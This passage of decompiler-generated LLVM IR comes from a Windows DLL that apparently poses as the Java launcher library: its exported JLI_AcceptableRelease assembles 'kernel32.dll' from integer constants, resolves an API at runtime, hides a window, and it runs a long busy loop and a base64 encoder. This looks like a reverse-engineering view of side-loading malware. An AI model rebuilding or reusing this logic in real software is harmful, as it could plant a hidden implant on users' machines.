  br i1 %12, label %dec_label_pc_10007487, label %dec_label_pc_10007472, !insn.addr !4014

dec_label_pc_10007472:                            ; preds = %dec_label_pc_1000745e
  br i1 %9, label %dec_label_pc_10007481, label %dec_label_pc_10007476, !insn.addr !4015

dec_label_pc_10007476:                            ; preds = %dec_label_pc_10007472
  %13 = sub i32 %0, %eax.1.reload, !insn.addr !4016
  store i32 %13, i32* %arg1, align 4, !insn.addr !4017
  ret i32 %11, !insn.addr !4018

dec_label_pc_10007481:                            ; preds = %dec_label_pc_10007472
  store i32 0, i32* %arg1, align 4, !insn.addr !4019
  br label %dec_label_pc_10007487, !insn.addr !4019

dec_label_pc_10007487:                            ; preds = %dec_label_pc_10007481, %dec_label_pc_1000745e
  ret i32 %11, !insn.addr !4020

dec_label_pc_1000748e:                            ; preds = %dec_label_pc_10007430
  store i32 0, i32* %arg1, align 4, !insn.addr !4021
  ret i32 -2147024809, !insn.addr !4022
}

define i32 @function_100074a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100074a0:
  %ecx.03.reg2mem = alloca i32, !insn.addr !4023
  %ecx.04.reg2mem = alloca i32, !insn.addr !4023
  %edx.05.reg2mem = alloca i32, !insn.addr !4023
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = sub i32 %arg1, %0, !insn.addr !4024
  store i32 2147483647, i32* %edx.05.reg2mem
  br label %dec_label_pc_100074b7

dec_label_pc_100074b7:                            ; preds = %dec_label_pc_100074a0, %dec_label_pc_100074be
  %ecx.04.reload = load i32, i32* %ecx.04.reg2mem
  %edx.05.reload = load i32, i32* %edx.05.reg2mem
  %2 = add i32 %1, %ecx.04.reload, !insn.addr !4025
  %3 = inttoptr i32 %2 to i8*, !insn.addr !4025
  %4 = load i8, i8* %3, align 1, !insn.addr !4025
  %5 = icmp eq i8 %4, 0, !insn.addr !4026
  br i1 %5, label %dec_label_pc_100074d5, label %dec_label_pc_100074be, !insn.addr !4027

dec_label_pc_100074be:                            ; preds = %dec_label_pc_100074b7
  %6 = inttoptr i32 %ecx.04.reload to i8*, !insn.addr !4028
  store i8 %4, i8* %6, align 1, !insn.addr !4028
  %7 = add i32 %ecx.04.reload, 1, !insn.addr !4029
  %8 = add nsw i32 %edx.05.reload, -1, !insn.addr !4030
  %9 = icmp eq i32 %8, 1, !insn.addr !4031
  store i32 %8, i32* %edx.05.reg2mem, !insn.addr !4032
  store i32 %7, i32* %ecx.04.reg2mem, !insn.addr !4032
  store i32 %7, i32* %ecx.03.reg2mem, !insn.addr !4032
  br i1 %9, label %dec_label_pc_100074e8, label %dec_label_pc_100074b7, !insn.addr !4032

dec_label_pc_100074d5:                            ; preds = %dec_label_pc_100074b7
  %10 = icmp eq i32 %edx.05.reload, 0, !insn.addr !4033
  %11 = icmp eq i1 %10, false, !insn.addr !4034
  store i32 %ecx.04.reload, i32* %ecx.03.reg2mem, !insn.addr !4034
  br i1 %11, label %dec_label_pc_100074e8, label %dec_label_pc_100074d9, !insn.addr !4034

dec_label_pc_100074d9:                            ; preds = %dec_label_pc_100074d5
  %12 = trunc i32 %edx.05.reload to i8, !insn.addr !4035
  %13 = add i32 %ecx.04.reload, -1, !insn.addr !4035
  %14 = inttoptr i32 %13 to i8*, !insn.addr !4035
  store i8 %12, i8* %14, align 1, !insn.addr !4035
  ret i32 -2147024774, !insn.addr !4036

dec_label_pc_100074e8:                            ; preds = %dec_label_pc_100074be, %dec_label_pc_100074d5
  %ecx.03.reload = load i32, i32* %ecx.03.reg2mem
  %15 = inttoptr i32 %ecx.03.reload to i8*, !insn.addr !4037
  store i8 0, i8* %15, align 1, !insn.addr !4037
  ret i32 0, !insn.addr !4038
}

define i32 @function_10007500(i32* %arg1, i32* %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_10007500:
  %ebx.0.reg2mem = alloca i32, !insn.addr !4039
  %ecx.2.reg2mem = alloca i32, !insn.addr !4039
  %ecx.1.reg2mem = alloca i32, !insn.addr !4039
  %edx.0.reg2mem = alloca i32, !insn.addr !4039
  %ecx.0.reg2mem = alloca i32, !insn.addr !4039
  %eax.0.reg2mem = alloca i32, !insn.addr !4039
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %0, 0, !insn.addr !4040
  br i1 %2, label %dec_label_pc_10007535, label %dec_label_pc_1000750c, !insn.addr !4041

dec_label_pc_1000750c:                            ; preds = %dec_label_pc_10007500
  %3 = ptrtoint i32* %arg1 to i32
  %4 = sub i32 %3, %1, !insn.addr !4042
  store i32 2147483646, i32* %eax.0.reg2mem, !insn.addr !4042
  br label %dec_label_pc_10007516, !insn.addr !4042

dec_label_pc_10007516:                            ; preds = %dec_label_pc_10007523, %dec_label_pc_1000750c
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %5 = icmp eq i32 %eax.0.reload, 0, !insn.addr !4043
  br i1 %5, label %dec_label_pc_10007531, label %dec_label_pc_1000751a, !insn.addr !4044

dec_label_pc_1000751a:                            ; preds = %dec_label_pc_10007516
  %6 = add i32 %4, %ecx.0.reload, !insn.addr !4045
  %7 = inttoptr i32 %6 to i16*, !insn.addr !4045
  %8 = load i16, i16* %7, align 2, !insn.addr !4045
  %9 = icmp eq i16 %8, 0, !insn.addr !4046
  br i1 %9, label %dec_label_pc_10007531, label %dec_label_pc_10007523, !insn.addr !4047

dec_label_pc_10007523:                            ; preds = %dec_label_pc_1000751a
  %10 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !4048
  store i16 %8, i16* %10, align 2, !insn.addr !4048
  %11 = add nsw i32 %eax.0.reload, -1, !insn.addr !4049
  %12 = add i32 %ecx.0.reload, 2, !insn.addr !4050
  %13 = add i32 %edx.0.reload, -1, !insn.addr !4051
  %14 = icmp eq i32 %13, 0, !insn.addr !4051
  %15 = icmp eq i1 %14, false, !insn.addr !4052
  store i32 %11, i32* %eax.0.reg2mem, !insn.addr !4052
  store i32 %12, i32* %ecx.0.reg2mem, !insn.addr !4052
  store i32 %13, i32* %edx.0.reg2mem, !insn.addr !4052
  store i32 %12, i32* %ecx.1.reg2mem, !insn.addr !4052
  br i1 %15, label %dec_label_pc_10007516, label %dec_label_pc_10007535, !insn.addr !4052

dec_label_pc_10007531:                            ; preds = %dec_label_pc_1000751a, %dec_label_pc_10007516
  %16 = icmp eq i32 %edx.0.reload, 0, !insn.addr !4053
  %17 = icmp eq i1 %16, false, !insn.addr !4054
  store i32 %ecx.0.reload, i32* %ecx.1.reg2mem, !insn.addr !4054
  store i32 %ecx.0.reload, i32* %ecx.2.reg2mem, !insn.addr !4054
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !4054
  br i1 %17, label %dec_label_pc_1000753d, label %dec_label_pc_10007535, !insn.addr !4054

dec_label_pc_10007535:                            ; preds = %dec_label_pc_10007523, %dec_label_pc_10007531, %dec_label_pc_10007500
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %18 = add i32 %ecx.1.reload, -2, !insn.addr !4055
  store i32 %18, i32* %ecx.2.reg2mem, !insn.addr !4056
  store i32 -2147024774, i32* %ebx.0.reg2mem, !insn.addr !4056
  br label %dec_label_pc_1000753d, !insn.addr !4056

dec_label_pc_1000753d:                            ; preds = %dec_label_pc_10007535, %dec_label_pc_10007531
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %19 = inttoptr i32 %ecx.2.reload to i16*, !insn.addr !4057
  store i16 0, i16* %19, align 2, !insn.addr !4057
  ret i32 %ebx.0.reload, !insn.addr !4058
}

define i32 @function_10007550(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007550:
  %ebx.1.reg2mem = alloca i32, !insn.addr !4059
  %eax.2.reg2mem = alloca i32, !insn.addr !4059
  %ecx.1.reg2mem = alloca i32, !insn.addr !4059
  %eax.1.reg2mem = alloca i32, !insn.addr !4059
  %ecx.1.ph.reg2mem = alloca i32, !insn.addr !4059
  %ecx.0.reg2mem = alloca i32, !insn.addr !4059
  %esi.0.reg2mem = alloca i32, !insn.addr !4059
  %ebx.0.reg2mem = alloca i32, !insn.addr !4059
  %eax.0.reg2mem = alloca i32, !insn.addr !4059
  %stack_var_-12 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !4060
  %1 = add i32 %0, -4
  %2 = inttoptr i32 %1 to i32*
  %3 = add i32 %0, -8
  %4 = inttoptr i32 %3 to i32*
  store i32 2, i32* %ebx.0.reg2mem, !insn.addr !4061
  store i32 3, i32* %esi.0.reg2mem, !insn.addr !4061
  br label %dec_label_pc_10007560, !insn.addr !4061

dec_label_pc_10007560:                            ; preds = %dec_label_pc_10007591, %dec_label_pc_10007550
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %5 = add i32 %esi.0.reload, -1, !insn.addr !4062
  %6 = icmp slt i32 %5, 2, !insn.addr !4063
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !4063
  store i32 2, i32* %ecx.1.reg2mem, !insn.addr !4063
  br i1 %6, label %dec_label_pc_1000757e, label %dec_label_pc_10007570.preheader, !insn.addr !4063

dec_label_pc_10007570.preheader:                  ; preds = %dec_label_pc_10007560
  %7 = ashr i32 %esi.0.reload, 31, !insn.addr !4064
  %8 = zext i32 %esi.0.reload to i64, !insn.addr !4065
  %9 = zext i32 %7 to i64, !insn.addr !4065
  %10 = mul i64 %9, 4294967296, !insn.addr !4065
  %11 = or i64 %10, %8, !insn.addr !4065
  store i32 2, i32* %ecx.0.reg2mem
  br label %dec_label_pc_10007570

dec_label_pc_10007570:                            ; preds = %dec_label_pc_10007570.preheader, %dec_label_pc_10007579
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %12 = zext i32 %ecx.0.reload to i64, !insn.addr !4065
  %13 = srem i64 %11, %12, !insn.addr !4065
  %14 = trunc i64 %13 to i32, !insn.addr !4065
  %15 = icmp eq i32 %14, 0, !insn.addr !4066
  store i32 %ecx.0.reload, i32* %ecx.1.ph.reg2mem, !insn.addr !4067
  br i1 %15, label %dec_label_pc_1000757e.loopexit, label %dec_label_pc_10007579, !insn.addr !4067

dec_label_pc_10007579:                            ; preds = %dec_label_pc_10007570
  %16 = add i32 %ecx.0.reload, 1, !insn.addr !4068
  %17 = icmp sgt i32 %16, %5, !insn.addr !4069
  store i32 %16, i32* %ecx.0.reg2mem, !insn.addr !4069
  store i32 %16, i32* %ecx.1.ph.reg2mem, !insn.addr !4069
  br i1 %17, label %dec_label_pc_1000757e.loopexit, label %dec_label_pc_10007570, !insn.addr !4069

dec_label_pc_1000757e.loopexit:                   ; preds = %dec_label_pc_10007570, %dec_label_pc_10007579
  %ecx.1.ph.reload = load i32, i32* %ecx.1.ph.reg2mem
  %18 = sdiv i64 %11, %12, !insn.addr !4065
  %19 = trunc i64 %18 to i32, !insn.addr !4065
  store i32 %19, i32* %eax.1.reg2mem
  store i32 %ecx.1.ph.reload, i32* %ecx.1.reg2mem
  br label %dec_label_pc_1000757e

dec_label_pc_1000757e:                            ; preds = %dec_label_pc_1000757e.loopexit, %dec_label_pc_10007560
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %20 = icmp eq i32 %ecx.1.reload, %esi.0.reload, !insn.addr !4070
  %21 = icmp eq i1 %20, false, !insn.addr !4071
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !4071
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !4071
  br i1 %21, label %dec_label_pc_10007591, label %dec_label_pc_10007582, !insn.addr !4071

dec_label_pc_10007582:                            ; preds = %dec_label_pc_1000757e
  store i32 %esi.0.reload, i32* %2, align 4, !insn.addr !4072
  store i32 ptrtoint ([4 x i8]* @global_var_100393c0 to i32), i32* %4, align 4, !insn.addr !4073
  %22 = call i32 @function_100073c0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !4074
  %23 = add i32 %ebx.0.reload, 1, !insn.addr !4075
  store i32 %22, i32* %eax.2.reg2mem, !insn.addr !4075
  store i32 %23, i32* %ebx.1.reg2mem, !insn.addr !4075
  br label %dec_label_pc_10007591, !insn.addr !4075

dec_label_pc_10007591:                            ; preds = %dec_label_pc_10007582, %dec_label_pc_1000757e
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %24 = add i32 %esi.0.reload, 1, !insn.addr !4076
  %25 = icmp slt i32 %ebx.1.reload, 80001, !insn.addr !4077
  store i32 %eax.2.reload, i32* %eax.0.reg2mem, !insn.addr !4077
  store i32 %ebx.1.reload, i32* %ebx.0.reg2mem, !insn.addr !4077
  store i32 %24, i32* %esi.0.reg2mem, !insn.addr !4077
  br i1 %25, label %dec_label_pc_10007560, label %dec_label_pc_1000759a, !insn.addr !4077

dec_label_pc_1000759a:                            ; preds = %dec_label_pc_10007591
  ret i32 %eax.2.reload, !insn.addr !4078
}

define i32 @function_100075a0() local_unnamed_addr {
dec_label_pc_100075a0:
  store i32 1852990827, i32* bitcast ([13 x i8]* @global_var_1003d9e0 to i32*), align 4, !insn.addr !4079
  store i32 842230885, i32* bitcast ([9 x i8]* @global_var_1003d9e4 to i32*), align 4, !insn.addr !4080
  store i32 1819042862, i32* bitcast ([5 x i8]* @global_var_1003d9e8 to i32*), align 4, !insn.addr !4081
  store i8 0, i8* bitcast (i32* @global_var_1003d9ec to i8*), align 4, !insn.addr !4082
  %0 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1003d9e0, i32 0, i32 0)), !insn.addr !4083
  %1 = load i128, i128* @global_var_10039c70, align 4, !insn.addr !4084
  %2 = call i128 @__asm_movaps(i128 %1), !insn.addr !4084
  call void @__asm_movups(i128 undef, i128 %2), !insn.addr !4085
  %3 = call i32 ()* @GetProcAddress(i32* null, i8* bitcast (i32* @1 to i8*)), !insn.addr !4086
  %4 = ptrtoint i32 ()* %3 to i32, !insn.addr !4086
  store i32 %4, i32* @global_var_10040950, align 4, !insn.addr !4087
  %5 = icmp eq i32 ()* %3, null, !insn.addr !4088
  br i1 %5, label %dec_label_pc_10007614, label %dec_label_pc_10007605, !insn.addr !4089

dec_label_pc_10007605:                            ; preds = %dec_label_pc_100075a0
  %6 = bitcast i32 ()* %3 to i32*, !insn.addr !4090
  %7 = call i1 @ShowWindow(i32* %6, i32 0), !insn.addr !4090
  br label %dec_label_pc_10007614, !insn.addr !4090

dec_label_pc_10007614:                            ; preds = %dec_label_pc_10007605, %dec_label_pc_100075a0
  %8 = call i32 @function_10007be0(), !insn.addr !4091
  %9 = call i32 @__asm_int3(), !insn.addr !4092
  %10 = call i32 @__asm_int3(), !insn.addr !4093
  %11 = call i32 @__asm_int3(), !insn.addr !4094
  %12 = call i32 @__asm_int3(), !insn.addr !4095
  %13 = call i32 @__asm_int3(), !insn.addr !4096
  %14 = call i32 @__asm_int3(), !insn.addr !4097
  %15 = call i32 @__asm_int3(), !insn.addr !4098
  ret i32 %15, !insn.addr !4098
}

define i32 @JLI_AcceptableRelease() local_unnamed_addr {
dec_label_pc_10007620:
  %0 = call i32 @function_100075a0(), !insn.addr !4099
  ret i32 %0, !insn.addr !4099
}

define i32 @"_DllMain@12"() local_unnamed_addr {
dec_label_pc_10007630:
  ret i32 1, !insn.addr !4100
}

define i32 @function_10007640() local_unnamed_addr {
dec_label_pc_10007640:
  %ebx.1.reg2mem = alloca i32, !insn.addr !4101
  %ecx.1.reg2mem = alloca i32, !insn.addr !4101
  %eax.2.reg2mem = alloca i32, !insn.addr !4101
  %edx.1.reg2mem = alloca i32, !insn.addr !4101
  %edi.0.reg2mem = alloca i32, !insn.addr !4101
  %stack_var_-8.0.reg2mem = alloca i8*, !insn.addr !4101
  %stack_var_-16.0.reg2mem = alloca i32, !insn.addr !4101
  %esi.0.reg2mem = alloca i32, !insn.addr !4101
  %merge.reg2mem = alloca i32, !insn.addr !4101
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %0, 0, !insn.addr !4102
  %3 = icmp eq i1 %2, false, !insn.addr !4103
  br i1 %3, label %dec_label_pc_1000765f, label %dec_label_pc_10007659, !insn.addr !4103

dec_label_pc_10007659:                            ; preds = %dec_label_pc_100077b1, %dec_label_pc_10007674, %dec_label_pc_10007640
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !4104

dec_label_pc_1000765f:                            ; preds = %dec_label_pc_10007640
  %4 = icmp eq i32 %1, 0, !insn.addr !4105
  %5 = icmp eq i1 %4, false, !insn.addr !4106
  br i1 %5, label %dec_label_pc_10007674, label %dec_label_pc_10007668, !insn.addr !4106

dec_label_pc_10007668:                            ; preds = %dec_label_pc_1000765f, %dec_label_pc_10007668
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !4107
  %7 = load i8, i8* %6, align 1, !insn.addr !4107
  %8 = add i32 %esi.0.reload, 1, !insn.addr !4108
  %9 = icmp eq i8 %7, 0, !insn.addr !4109
  %10 = icmp eq i1 %9, false, !insn.addr !4110
  store i32 %8, i32* %esi.0.reg2mem, !insn.addr !4110
  br i1 %10, label %dec_label_pc_10007668, label %dec_label_pc_1000766f, !insn.addr !4110

dec_label_pc_1000766f:                            ; preds = %dec_label_pc_10007668
  %11 = sub i32 %esi.0.reload, %0, !insn.addr !4111
  store i32 %11, i32* %stack_var_-16.0.reg2mem, !insn.addr !4112
  br label %dec_label_pc_10007674, !insn.addr !4112

dec_label_pc_10007674:                            ; preds = %dec_label_pc_1000766f, %dec_label_pc_1000765f
  %12 = mul i32 %1, 3, !insn.addr !4113
  %stack_var_-16.0.reload = load i32, i32* %stack_var_-16.0.reg2mem
  %13 = add i32 %12, 4, !insn.addr !4114
  %14 = call i32* @LocalAlloc(i32 64, i32 %13), !insn.addr !4115
  %15 = ptrtoint i32* %14 to i32, !insn.addr !4115
  %16 = icmp slt i32 %stack_var_-16.0.reload, 1
  store i32 %15, i32* %merge.reg2mem, !insn.addr !4116
  br i1 %16, label %dec_label_pc_10007659, label %dec_label_pc_1000768e, !insn.addr !4116

dec_label_pc_1000768e:                            ; preds = %dec_label_pc_10007674
  %17 = bitcast i32* %14 to i8*
  store i8* %17, i8** %stack_var_-8.0.reg2mem, !insn.addr !4117
  store i32 1, i32* %edi.0.reg2mem, !insn.addr !4117
  br label %dec_label_pc_10007697, !insn.addr !4117

dec_label_pc_10007697:                            ; preds = %dec_label_pc_100077b1, %dec_label_pc_1000768e
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %stack_var_-8.0.reload = load i8*, i8** %stack_var_-8.0.reg2mem
  %18 = add i32 %edi.0.reload, %0
  %19 = add i32 %18, -1, !insn.addr !4118
  %20 = inttoptr i32 %19 to i8*, !insn.addr !4118
  %21 = load i8, i8* %20, align 1, !insn.addr !4118
  %22 = icmp slt i32 %edi.0.reload, %stack_var_-16.0.reload, !insn.addr !4119
  store i32 0, i32* %edx.1.reg2mem, !insn.addr !4119
  br i1 %22, label %dec_label_pc_100076a3, label %dec_label_pc_100076a6, !insn.addr !4119

dec_label_pc_100076a3:                            ; preds = %dec_label_pc_10007697
  %23 = inttoptr i32 %18 to i8*, !insn.addr !4120
  %24 = load i8, i8* %23, align 1, !insn.addr !4120
  %25 = zext i8 %24 to i32, !insn.addr !4120
  store i32 %25, i32* %edx.1.reg2mem, !insn.addr !4120
  br label %dec_label_pc_100076a6, !insn.addr !4120

dec_label_pc_100076a6:                            ; preds = %dec_label_pc_10007697, %dec_label_pc_100076a3
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %26 = add i32 %edi.0.reload, 1, !insn.addr !4121
  %27 = icmp slt i32 %26, %stack_var_-16.0.reload, !insn.addr !4122
  store i32 0, i32* %eax.2.reg2mem, !insn.addr !4122
  br i1 %27, label %dec_label_pc_100076ad, label %dec_label_pc_100076b4, !insn.addr !4122

dec_label_pc_100076ad:                            ; preds = %dec_label_pc_100076a6
  %28 = add i32 %26, %0, !insn.addr !4123
  %29 = inttoptr i32 %28 to i8*, !insn.addr !4123
  %30 = load i8, i8* %29, align 1, !insn.addr !4123
  %31 = zext i8 %30 to i32, !insn.addr !4123
  store i32 %31, i32* %eax.2.reg2mem, !insn.addr !4123
  br label %dec_label_pc_100076b4, !insn.addr !4123

dec_label_pc_100076b4:                            ; preds = %dec_label_pc_100076a6, %dec_label_pc_100076ad
  %32 = zext i8 %21 to i32, !insn.addr !4118
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %33 = udiv i32 %32, 4, !insn.addr !4124
  %34 = trunc i32 %33 to i8, !insn.addr !4125
  %35 = icmp ult i8 %34, 26, !insn.addr !4125
  %36 = icmp eq i1 %35, false, !insn.addr !4126
  br i1 %36, label %dec_label_pc_100076e5, label %dec_label_pc_100076e0, !insn.addr !4126

dec_label_pc_100076e0:                            ; preds = %dec_label_pc_100076b4
  %37 = add nuw nsw i32 %33, 65, !insn.addr !4127
  store i32 %37, i32* %ecx.1.reg2mem, !insn.addr !4128
  br label %dec_label_pc_10007703, !insn.addr !4128

dec_label_pc_100076e5:                            ; preds = %dec_label_pc_100076b4
  %38 = icmp ult i8 %34, 52, !insn.addr !4129
  %39 = icmp eq i1 %38, false, !insn.addr !4130
  br i1 %39, label %dec_label_pc_100076ef, label %dec_label_pc_100076ea, !insn.addr !4130

dec_label_pc_100076ea:                            ; preds = %dec_label_pc_100076e5
  %40 = add nuw nsw i32 %33, 71, !insn.addr !4131
  store i32 %40, i32* %ecx.1.reg2mem, !insn.addr !4132
  br label %dec_label_pc_10007703, !insn.addr !4132

dec_label_pc_100076ef:                            ; preds = %dec_label_pc_100076e5
  %41 = icmp ult i8 %34, 62, !insn.addr !4133
  %42 = icmp eq i1 %41, false, !insn.addr !4134
  br i1 %42, label %dec_label_pc_100076f9, label %dec_label_pc_100076f4, !insn.addr !4134

dec_label_pc_100076f4:                            ; preds = %dec_label_pc_100076ef
  %43 = add nuw nsw i32 %33, 252, !insn.addr !4135
  %44 = and i32 %43, 255, !insn.addr !4135
  store i32 %44, i32* %ecx.1.reg2mem, !insn.addr !4136
  br label %dec_label_pc_10007703, !insn.addr !4136

dec_label_pc_100076f9:                            ; preds = %dec_label_pc_100076ef
  %45 = icmp eq i8 %34, 62, !insn.addr !4133
  %46 = icmp eq i1 %45, false, !insn.addr !4137
  %47 = zext i1 %46 to i32, !insn.addr !4137
  %48 = mul i32 %47, 4, !insn.addr !4138
  %49 = or i32 %48, 43, !insn.addr !4138
  store i32 %49, i32* %ecx.1.reg2mem, !insn.addr !4138
  br label %dec_label_pc_10007703, !insn.addr !4138

dec_label_pc_10007703:                            ; preds = %dec_label_pc_100076f9, %dec_label_pc_100076f4, %dec_label_pc_100076ea, %dec_label_pc_100076e0
  %50 = udiv i32 %edx.1.reload, 16, !insn.addr !4139
  %51 = mul i32 %32, 16, !insn.addr !4140
  %52 = and i32 %51, 48, !insn.addr !4140
  %53 = or i32 %50, %52
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %54 = trunc i32 %ecx.1.reload to i8, !insn.addr !4141
  store i8 %54, i8* %stack_var_-8.0.reload, align 1, !insn.addr !4141
  %55 = trunc i32 %53 to i8, !insn.addr !4142
  %56 = icmp ult i8 %55, 26, !insn.addr !4142
  %57 = icmp eq i1 %56, false, !insn.addr !4143
  br i1 %57, label %dec_label_pc_10007714, label %dec_label_pc_1000770f, !insn.addr !4143

dec_label_pc_1000770f:                            ; preds = %dec_label_pc_10007703
  %58 = add nuw nsw i32 %53, 65, !insn.addr !4144
  store i32 %58, i32* %ebx.1.reg2mem, !insn.addr !4145
  br label %dec_label_pc_10007732, !insn.addr !4145

dec_label_pc_10007714:                            ; preds = %dec_label_pc_10007703
  %59 = icmp ult i8 %55, 52, !insn.addr !4146
  %60 = icmp eq i1 %59, false, !insn.addr !4147
  br i1 %60, label %dec_label_pc_1000771e, label %dec_label_pc_10007719, !insn.addr !4147

dec_label_pc_10007719:                            ; preds = %dec_label_pc_10007714
  %61 = add nuw nsw i32 %53, 71, !insn.addr !4148
  store i32 %61, i32* %ebx.1.reg2mem, !insn.addr !4149
  br label %dec_label_pc_10007732, !insn.addr !4149

dec_label_pc_1000771e:                            ; preds = %dec_label_pc_10007714
  %62 = icmp ult i8 %55, 62, !insn.addr !4150
  %63 = icmp eq i1 %62, false, !insn.addr !4151
  br i1 %63, label %dec_label_pc_10007728, label %dec_label_pc_10007723, !insn.addr !4151

dec_label_pc_10007723:                            ; preds = %dec_label_pc_1000771e
  %64 = add nuw nsw i32 %53, 252, !insn.addr !4152
  %65 = and i32 %64, 255, !insn.addr !4152
  store i32 %65, i32* %ebx.1.reg2mem, !insn.addr !4153
  br label %dec_label_pc_10007732, !insn.addr !4153

dec_label_pc_10007728:                            ; preds = %dec_label_pc_1000771e
  %66 = icmp eq i8 %55, 62, !insn.addr !4150
  %67 = icmp eq i1 %66, false, !insn.addr !4154
  %68 = zext i1 %67 to i32, !insn.addr !4154
  %69 = mul i32 %68, 4, !insn.addr !4155
  %70 = or i32 %69, 43, !insn.addr !4155
  store i32 %70, i32* %ebx.1.reg2mem, !insn.addr !4155
  br label %dec_label_pc_10007732, !insn.addr !4155

dec_label_pc_10007732:                            ; preds = %dec_label_pc_10007728, %dec_label_pc_10007723, %dec_label_pc_10007719, %dec_label_pc_1000770f
  %71 = ptrtoint i8* %stack_var_-8.0.reload to i32, !insn.addr !4156
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %72 = trunc i32 %ebx.1.reload to i8, !insn.addr !4157
  %73 = add i32 %71, 1, !insn.addr !4157
  %74 = inttoptr i32 %73 to i8*, !insn.addr !4157
  store i8 %72, i8* %74, align 1, !insn.addr !4157
  br i1 %22, label %dec_label_pc_1000773c, label %dec_label_pc_10007772, !insn.addr !4158

dec_label_pc_1000773c:                            ; preds = %dec_label_pc_10007732
  %75 = mul i32 %edx.1.reload, 4, !insn.addr !4159
  %76 = and i32 %75, 60, !insn.addr !4159
  %77 = udiv i32 %eax.2.reload, 64, !insn.addr !4160
  %78 = or i32 %77, %76
  %79 = trunc i32 %78 to i8, !insn.addr !4161
  %80 = icmp ult i8 %79, 26, !insn.addr !4161
  %81 = icmp eq i1 %80, false, !insn.addr !4162
  br i1 %81, label %dec_label_pc_10007749, label %dec_label_pc_10007741, !insn.addr !4162

dec_label_pc_10007741:                            ; preds = %dec_label_pc_1000773c
  %82 = add nuw i8 %79, 65, !insn.addr !4163
  %83 = add i32 %71, 2, !insn.addr !4163
  %84 = inttoptr i32 %83 to i8*, !insn.addr !4163
  store i8 %82, i8* %84, align 1, !insn.addr !4163
  br label %dec_label_pc_10007776, !insn.addr !4164

dec_label_pc_10007749:                            ; preds = %dec_label_pc_1000773c
  %85 = icmp ult i8 %79, 52, !insn.addr !4165
  %86 = icmp eq i1 %85, false, !insn.addr !4166
  br i1 %86, label %dec_label_pc_10007756, label %dec_label_pc_1000774e, !insn.addr !4166

dec_label_pc_1000774e:                            ; preds = %dec_label_pc_10007749
  %87 = add nuw i8 %79, 71, !insn.addr !4167
  %88 = add i32 %71, 2, !insn.addr !4167
  %89 = inttoptr i32 %88 to i8*, !insn.addr !4167
  store i8 %87, i8* %89, align 1, !insn.addr !4167
  br label %dec_label_pc_10007776, !insn.addr !4168

dec_label_pc_10007756:                            ; preds = %dec_label_pc_10007749
  %90 = icmp ult i8 %79, 62, !insn.addr !4169
  %91 = icmp eq i1 %90, false, !insn.addr !4170
  br i1 %91, label %dec_label_pc_10007763, label %dec_label_pc_1000775b, !insn.addr !4170

dec_label_pc_1000775b:                            ; preds = %dec_label_pc_10007756
  %92 = add nsw i8 %79, -4, !insn.addr !4171
  %93 = add i32 %71, 2, !insn.addr !4171
  %94 = inttoptr i32 %93 to i8*, !insn.addr !4171
  store i8 %92, i8* %94, align 1, !insn.addr !4171
  br label %dec_label_pc_10007776, !insn.addr !4172

dec_label_pc_10007763:                            ; preds = %dec_label_pc_10007756
  %95 = icmp eq i8 %79, 62, !insn.addr !4169
  %96 = icmp eq i1 %95, false, !insn.addr !4173
  %97 = zext i1 %96 to i8, !insn.addr !4173
  %98 = mul i8 %97, 4, !insn.addr !4174
  %99 = or i8 %98, 43, !insn.addr !4174
  %100 = add i32 %71, 2, !insn.addr !4175
  %101 = inttoptr i32 %100 to i8*, !insn.addr !4175
  store i8 %99, i8* %101, align 1, !insn.addr !4175
  br label %dec_label_pc_10007776, !insn.addr !4176

dec_label_pc_10007772:                            ; preds = %dec_label_pc_10007732
  %102 = add i32 %71, 2, !insn.addr !4177
  %103 = inttoptr i32 %102 to i8*, !insn.addr !4177
  store i8 61, i8* %103, align 1, !insn.addr !4177
  br label %dec_label_pc_10007776, !insn.addr !4177

dec_label_pc_10007776:                            ; preds = %dec_label_pc_10007772, %dec_label_pc_10007763, %dec_label_pc_1000775b, %dec_label_pc_1000774e, %dec_label_pc_10007741
  br i1 %27, label %dec_label_pc_1000777d, label %dec_label_pc_100077ad, !insn.addr !4178

dec_label_pc_1000777d:                            ; preds = %dec_label_pc_10007776
  %104 = trunc i32 %eax.2.reload to i8
  %105 = and i8 %104, 63, !insn.addr !4179
  %106 = icmp ult i8 %105, 26, !insn.addr !4179
